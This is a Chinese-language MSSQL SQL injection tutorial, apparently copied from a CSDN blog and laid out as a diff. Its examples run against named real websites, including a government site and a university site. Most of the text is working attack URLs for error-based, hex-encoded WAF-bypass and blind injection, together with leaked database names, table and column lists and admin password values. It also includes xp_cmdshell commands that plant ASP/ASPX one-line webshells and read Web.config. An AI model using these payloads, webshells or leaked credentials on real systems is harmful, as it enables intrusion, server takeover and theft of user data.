@@ -1,0 +1,250 @@
+例子：www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1
+【１】首先爆版本：http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and @@version>0
+
+原因：＠＠version是mssql 的全局变量，如果我们把它写成这样 and @@version>0 那个后面的mssql就会强行把@@version 强行转换成数字，但是失败，所以就会将数据库信息暴露出来
+同样：通过
+@@SERVERNAME：爆计算机名称
+
+【2】：爆当前数据库名：http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and db_name()>0
+报错信息：在将 nvarchar 值 'kaifeng' 转换成数据类型 int 时失败。
+
+【3】当前用户：http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and User_Name()>0
+报错信息：在将 nvarchar 值 'dbo' 转换成数据类型 int 时失败。
+Ps：如果看到dbo 那么多半当前数据库的用户是dba权限
+
+【4】爆其他数据库:http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (SELECT top 1 Name FROM Master..SysDatabases)>0
+报错信息：在将 nvarchar 值 'master' 转换成数据类型 int 时失败。
+再爆其他的数据库则这么写：http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in ('master'))>0
+继续的话要这么写：http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in ('master','kaifeng'))>0
+
+【5】爆表则：http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (select top 1 name from [数据库名字].sys.all_objects where type='U' AND is_ms_shipped=0)>0
+例子：
+http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (select top 1 name from kaifeng.sys.all_objects where type='U' AND is_ms_shipped=0)>0
+报错信息:在将 nvarchar 值 'FRIENDLINK' 转换成数据类型 int 时失败。
+
+再爆其他表：http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (select top 1 name from kaifeng.sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('FRIENDLINK'))>0
+在继续：
+http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (select top 1 name from kaifeng.sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('FRIENDLINK','FRIENDLINK1'))>0
+
+【6】爆字段则：http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (select top 1 COLUMN_NAME from kaifeng.information_schema.columns where TABLE_NAME='A_WEBADMIN')>0
+
+例如：
+http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (select top 1 COLUMN_NAME from kaifeng.information_schema.columns where TABLE_NAME='A_WEBADMIN')>0
+报错信息：在将 nvarchar 值 'ID' 转换成数据类型 int 时失败。
+
+再爆其他字段：
+http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (select top 1 COLUMN_NAME from kaifeng.information_schema.columns where TABLE_NAME='A_WEBADMIN' and COLUMN_NAME not in('ID'))>0
+
+再继续：
+http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (select top 1 COLUMN_NAME from kaifeng.information_schema.columns where TABLE_NAME='A_WEBADMIN' and COLUMN_NAME not in('ID','A_USERNAME'))>0
+
+【7】爆数据：http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (select top 1 字段 from 数据库名.表名)>0
+例子：
+http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1 and (select top 1 A_PASSWORD from A_WEBADMIN)>0
+报错信息：在将 nvarchar 值 'B5A1EF8730200F93E50F4F5DEBBCAC0B' 转换成数据类型 int 时失败。
+
+如果数据的权限是dba，且知道网站路径的话，那么我们就可以用这个语句来写一句话小马进去：
+
+asp木马：
+
+http://www.kfgtfcj.gov.cn/lzygg/Zixun_show.aspx?id=1;exec master..xp_cmdshell 'echo "<%@ LANGUAGE=VBSCRIPT %>;<%eval request(chr(35))%>''" > d:\KfSite\kaifeng\2.asp'--
+
+aspx木马：
+
+http://xxxxxxxx/adduser.aspx?username=1';exec master..xp_cmdshell 'echo "<%@ LANGUAGE=Jscript %>;<%eval(Request("sb"),"unsafe")%>''" >C:\inetpub\wwwroot\2.aspx' --
+
+原理是sql server 支持堆叠查询，利用xp_cmdshell 可以执行cmd指令,cmd指令中用【echo 内容 > 文件】 可以写文件到磁盘里面
+
+绕过waf防火墙的注入：
+利用hex编码来绕过waf防火墙：
+例子
+http://www.ikcw.com/jiuzhu/qiuzhuzhe.aspx?username=niuxinyi
+利用hackbar 这个工具的Encoding 底下的HEX Encoding轻松把字符串编码成为可以利用的hex
+然后利用报错注入就可以轻松完爆这个网站
+
+【1】爆数据库版本：
+select convert(int,@@version) hex编码后：0x73656c65637420636f6e7665727428696e742c404076657273696f6e29
+然后我们这样注入：
+http://www.ikcw.com/jiuzhu/qiuzhuzhe.aspx?username=niuxinyi'; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c404076657273696f6e29 eXeC(@s)--
+报错信息为：在将 nvarchar 值 'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) 
+Apr 2 2010 15:48:46 
+Copyright (c) Microsoft Corporation
+Standard Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)
+' 转换成数据类型 int 时失败。
+
+【2】爆当前数据库
+select convert(int,db_name()) hex 编码后：
+0x73656c65637420636f6e7665727428696e742c64625f6e616d65282929
+
+然后我们这样注入：
+http://www.ikcw.com/jiuzhu/qiuzhuzhe.aspx?username=niuxinyi'; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c64625f6e616d65282929 eXeC(@s)--
+报错信息为：在将 nvarchar 值 'qds0240012_db' 转换成数据类型 int 时失败。
+
+【3】爆用户：
+select convert(int,User_Name())
+hex编码后：
+0x73656c65637420636f6e7665727428696e742c557365725f4e616d65282929
+
+这样注入：
+http://www.ikcw.com/jiuzhu/qiuzhuzhe.aspx?username=niuxinyi'; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c557365725f4e616d65282929 eXeC(@s)--
+报错信息：
+在将 nvarchar 值 'dbo' 转换成数据类型 int 时失败。
+
+【3】爆表：
+select convert(int, (select top 1 name from qds0240012_db
+.sys.all_objects where type='U' AND is_ms_shipped=0))
+
+hex编码后：
+0x73656c65637420636f6e7665727428696e742c202873656c65637420746f702031206e616d652066726f6d20716473303234303031325f6462202e7379732e616c6c5f6f626a6563747320776865726520747970653d27552720414e442069735f6d735f736869707065643d302929
+
+我们这样注入：http://www.ikcw.com/jiuzhu/qiuzhuzhe.aspx?username=niuxinyi'; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c202873656c65637420746f702031206e616d652066726f6d20716473303234303031325f6462202e7379732e616c6c5f6f626a6563747320776865726520747970653d27552720414e442069735f6d735f736869707065643d302929 eXeC(@s)--
+
+报错信息：在将 nvarchar 值 'CMS_ArticleClass' 转换成数据类型 int 时失败。
+继续爆表：
+select convert(int, (select top 1 name from qds0240012_db.sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('CMS_ArticleClass')))
+
+hex编码后：
+0x73656c65637420636f6e7665727428696e742c202873656c65637420746f702031206e616d652066726f6d20716473303234303031325f6462202e7379732e616c6c5f6f626a6563747320776865726520747970653d27552720414e442069735f6d735f736869707065643d3020616e64206e616d65206e6f7420696e202827434d535f41727469636c65436c61737327292929
+
+这样注入：
+http://www.ikcw.com/jiuzhu/qiuzhuzhe.aspx?username=niuxinyi'; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c202873656c65637420746f702031206e616d652066726f6d20716473303234303031325f6462202e7379732e616c6c5f6f626a6563747320776865726520747970653d27552720414e442069735f6d735f736869707065643d3020616e64206e616d65206e6f7420696e202827434d535f41727469636c65436c61737327292929 eXeC(@s)--
+
+报错信息为：
+在将 nvarchar 值 'CMS_Career' 转换成数据类型 int 时失败。
+继续
+
+select convert(int, (select top 1 name from qds0240012_db.sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('CMS_ArticleClass','CMS_Career')))
+转换成hex:
+0x73656c65637420636f6e7665727428696e742c202873656c65637420746f702031206e616d652066726f6d20716473303234303031325f6462202e7379732e616c6c5f6f626a6563747320776865726520747970653d27552720414e442069735f6d735f736869707065643d3020616e64206e616d65206e6f7420696e202827434d535f41727469636c65436c617373272c27434d535f43617265657227292929
+
+这样注入：
+http://www.ikcw.com/jiuzhu/qiuzhuzhe.aspx?username=niuxinyi'; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c202873656c65637420746f702031206e616d652066726f6d20716473303234303031325f6462202e7379732e616c6c5f6f626a6563747320776865726520747970653d27552720414e442069735f6d735f736869707065643d3020616e64206e616d65206e6f7420696e202827434d535f41727469636c65436c617373272c27434d535f43617265657227292929 eXeC(@s)--
+
+报错信息：
+在将 nvarchar 值 'CMS_CareerClass' 转换成数据类型 int 时失败。
+
+表为： 'CMS_ArticleClass','CMS_Career','CMS_CareerClass','CMS_Channel','CMS_Comment','Clz_Article','CMS_DrugsClass','CMS_Article','CMS_Fankui','CMS_Hospital','CMS_Message','CMS_Region_City','CMS_Topics','CMS_Region_District','CMS_Region_Province','CMS_SeekHelp','CMS_Sensitive','CMS_ShortMessage','CMS_TopicsClass','CMS_Drugs','CMS_Transaction','CMS_HospitalClass','CMS_Type','CMS_UserGroup','CJ_BianMa','CJ_GuiZe','CJ_IsDown','CJ_Item','CJ_LanMu','CJ_News','CJ_Pic','CJ_Site','Clz_Article_img','CMS_Userinfo','Clz_Channel','Clz_Column','Clz_Comment','Clz_Content','Clz_Image','Clz_Link','Clz_LinkCate','Clz_Model','Clz_Notice','Clz_Product','Clz_Solicitate','Clz_UserHome','CMS_Admin','CMS_AdminGroup','Clz_Video','Clz_WebSite','D99_Tmp','dtproperties','FeedBack','pangolin_test_table','syscommand','UserSign','vw_Channel','vw_Column','xiaolu','zzq_AD_AD','zzq_AD_Class'
+
+【4】爆字段：
+select convert(int,(select top 1 COLUMN_NAME from qds0240012_db.information_schema.columns where TABLE_NAME='CMS_Userinfo'))
+
+hex编码：
+0x73656c65637420636f6e7665727428696e742c2873656c65637420746f70203120434f4c554d4e5f4e414d452066726f6d20716473303234303031325f64622e696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265205441424c455f4e414d453d27434d535f55736572696e666f272929
+
+这样注入：
+http://www.ikcw.com/jiuzhu/qiuzhuzhe.aspx?username=niuxinyi'; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c2873656c65637420746f70203120434f4c554d4e5f4e414d452066726f6d20716473303234303031325f64622e696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265205441424c455f4e414d453d27434d535f55736572696e666f272929 eXeC(@s)--
+
+报错信息：
+在将 nvarchar 值 'id' 转换成数据类型 int 时失败。
+
+继续：
+select convert(int,(select top 1 COLUMN_NAME from qds0240012_db.information_schema.columns where TABLE_NAME='CMS_Userinfo' and COLUMN_NAME not in ('id')))
+
+hex编码：
+0x73656c65637420636f6e7665727428696e742c2873656c65637420746f70203120434f4c554d4e5f4e414d452066726f6d20716473303234303031325f64622e696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265205441424c455f4e414d453d27434d535f55736572696e666f2720616e6420434f4c554d4e5f4e414d45206e6f7420696e202827696427292929
+
+这样注入：
+http://www.ikcw.com/jiuzhu/qiuzhuzhe.aspx?username=niuxinyi'; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c2873656c65637420746f70203120434f4c554d4e5f4e414d452066726f6d20716473303234303031325f64622e696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265205441424c455f4e414d453d27434d535f55736572696e666f2720616e6420434f4c554d4e5f4e414d45206e6f7420696e202827696427292929 eXeC(@s)--
+
+报错信息：
+在将 nvarchar 值 'username' 转换成数据类型 int 时失败。
+
+在继续：
+
+select convert(int,(select top 1 COLUMN_NAME from qds0240012_db.information_schema.columns where TABLE_NAME='CMS_Userinfo' and COLUMN_NAME not in ('id','username')))
+
+hex编码：
+0x73656c65637420636f6e7665727428696e742c2873656c65637420746f70203120434f4c554d4e5f4e414d452066726f6d20716473303234303031325f64622e696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265205441424c455f4e414d453d27434d535f55736572696e666f2720616e6420434f4c554d4e5f4e414d45206e6f7420696e2028276964272c27757365726e616d6527292929
+
+这样注入：
+http://www.ikcw.com/jiuzhu/qiuzhuzhe.aspx?username=niuxinyi'; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c2873656c65637420746f70203120434f4c554d4e5f4e414d452066726f6d20716473303234303031325f64622e696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265205441424c455f4e414d453d27434d535f55736572696e666f2720616e6420434f4c554d4e5f4e414d45206e6f7420696e2028276964272c27757365726e616d6527292929 eXeC(@s)--
+
+报错信息：
+在将 nvarchar 值 'nickname' 转换成数据类型 int 时失败。
+
+CMS_Userinfo 字段：
+'id','username','nickname','password','realname','problem','answer','gender','age','adminid','groupid','regip','joindate','lastip','lastvisitdate','digestposts','pageviews','popular','unwelcome','credits','extcredits1','extcredits2','extcredits3','extcredits4','extcredits5','extcredits6','extcredits7','extcredits8','avatar','email','onlinestate','onlineDate','vip','isalliance','status','phone','mobile','qq','msn','address','postcode','sitename','siteIntroduction','website','sitetype','income','expenditure','funds','birthday','province','district','city','logincount','integral','gold','top','headlines','recommend','audit','orderid','healthlevel','professional','post','isdelete','deletestaff','datetime','code','edu','national','remark','photo','usertype','yuyan','fuwuneirong','fuwushijian'
+
+CMS_Admin字段：
+'id','username','password','realname','lastloginip','lastlogintime','logincount','allowmultilogin','groupid','groupname'
+
+【5】爆数据：
+
+select convert(int,(select top 1 username from CMS_Admin))
+
+hex编码：
+0x73656c65637420636f6e7665727428696e742c2873656c65637420746f70203120757365726e616d652066726f6d20434d535f41646d696e2929
+
+这样注入：
+http://www.ikcw.com/jiuzhu/qiuzhuzhe.aspx?username=niuxinyi'; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c2873656c65637420746f70203120757365726e616d652066726f6d20434d535f41646d696e2929 eXeC(@s)--
+
+报错信息：
+在将 nvarchar 值 'admin' 转换成数据类型 int 时失败。
+
+继续，爆密码
+
+select convert(int,(select top 1 password from CMS_Admin))
+hex编码：
+0x73656c65637420636f6e7665727428696e742c2873656c65637420746f7020312070617373776f72642066726f6d20434d535f41646d696e2929
+这样注入：
+http://www.ikcw.com/jiuzhu/qiuzhuzhe.aspx?username=niuxinyi'; dEcLaRe @s vArChAr(8000) sEt @s=0x73656c65637420636f6e7665727428696e742c2873656c65637420746f7020312070617373776f72642066726f6d20434d535f41646d696e2929 eXeC(@s)--
+报错信息：
+在将 nvarchar 值 'sOKhmQxCdfzQy8GPXSskPPIV73jEtf0xvNlvUT3LfsoWe6Cw4ZnsqSlsaYhkMJCR' 转换成数据类型 int 时失败。
+
+盲注：
+例子：
+http://wenfa.nchu.edu.cn/md.aspx?t=0&c=c1
+先说一些函数的说明：
+substring(str,start,len) 截取字符串的作用，第一个参数为要截取的字符串，第二个参数为从哪里开始截取，第三个参数为截取的长度
+ascii(char) 把字符转换为ascii值
+
+【1】爆数据库版本：
+wenfa.nchu.edu.cn/md.aspx?c=c1'/**/and/**/ascii(substring(@@version,1,1))>0/**/--&t=0
+正常页面
+wenfa.nchu.edu.cn/md.aspx?c=c1'/**/and/**/ascii(substring(@@version,1,1))>100/**/--&t=0
+不正常页面
+
+说明@@version的第一个字母的ascii 的范围是在0到100 之间
+
+wenfa.nchu.edu.cn/md.aspx?c=c1'/**/and/**/ascii(substring(@@version,1,1))=77/**/--&t=0
+
+正常页面，说明@@version的第一个字母的ascii 的值是77，查表可知为M
+第二个字母的注入为：
+wenfa.nchu.edu.cn/md.aspx?c=c1'/**/and/**/ascii(substring(@@version,2,1))>0/**/--&t=0
+方法相同
+
+【2】爆当前数据库名字
+wenfa.nchu.edu.cn/md.aspx?c=c1'/**/and/**/ascii(substring(db_name(),1,1))>200/**/--&t=0
+ascii大于140发现页面正常，则当前的数据库的名字为中文，则换成这样注入：wenfa.nchu.edu.cn/md.aspx?c=c1'/**/and/**/unicode(substring(db_name(),1,1))>200/**/--&t=0
+
+最后发现：
+wenfa.nchu.edu.cn/md.aspx?c=c1'/**/and/**/unicode(substring(db_name(),1,1))=25991/**/--&t=0
+在http://www.bangnishouji.com/tools/chtounicode.html查询
+文 转换成中文，就是“文”字
+最后注入发现当前数据库的为：文法学院
+
+【3】爆表
+
+wenfa.nchu.edu.cn/md.aspx?c=c1'/**/and/**/ascii(substring((select/**/top/**/1 name/**/from/**/文法学院.sys.all_objects where type='U'/**/AND/**/is_ms_shipped=0),1,1))>0/**/--&t=0
+
+爆第二张表：
+wenfa.nchu.edu.cn/md.aspx?c=c1'/**/and/**/ascii(substring((select/**/top/**/1/**/name/**/from/**/文法学院.sys.all_objects where type='U'/**/AND/**/is_ms_shipped=0 and name not in('Tb_SysUser')),1,1))>0/**/--&t=0
+
+【4】爆Tb_SysUser 表的字段：
+wenfa.nchu.edu.cn/md.aspx?c=c1'/**/and/**/ascii(substring((select/**/top/**/ 1/**/COLUMN_NAME from/**/文法学院.information_schema.columns/**/where/**/TABLE_NAME='Tb_SysUser'),1,1))>0/**/--&t=0
+
+爆第二个字段：
+wenfa.nchu.edu.cn/md.aspx?c=c1'/**/and/**/ascii(substring((select/**/top/**/ 1/**/COLUMN_NAME/**/ from/**/文法学院.information_schema.columns/**/where/**/TABLE_NAME='Tb_SysUser'/**/and/**/COLUMN_NAME/**/not/**/in('fPwd')),1,1))>0/**/--&t=0
+
+【5】爆数据
+wenfa.nchu.edu.cn/md.aspx?c=c1'/**/and/**/ascii(substring((select/**/top/**/1/**/fPwd/**/from/**/Tb_SysUser),1,1))>0/**/--&t=0
+
+来源：https://blog.csdn.net/niexinming/article/details/49055609
+
+--判断表是否存在，存在删除,创建表，执行命令，回显
+if exists (select * from sys.objects where name = 'temp2'and type = 'U')
+drop table temp2;--删除
+create table temp2([output] varchar(1000));--创建
+insert temp2 exec master.dbo.xp_cmdshell 'type F:\Web.config';--读取文件
+select convert(int,(select * from temp2 FOR XML PATH('')));--显示文件
+
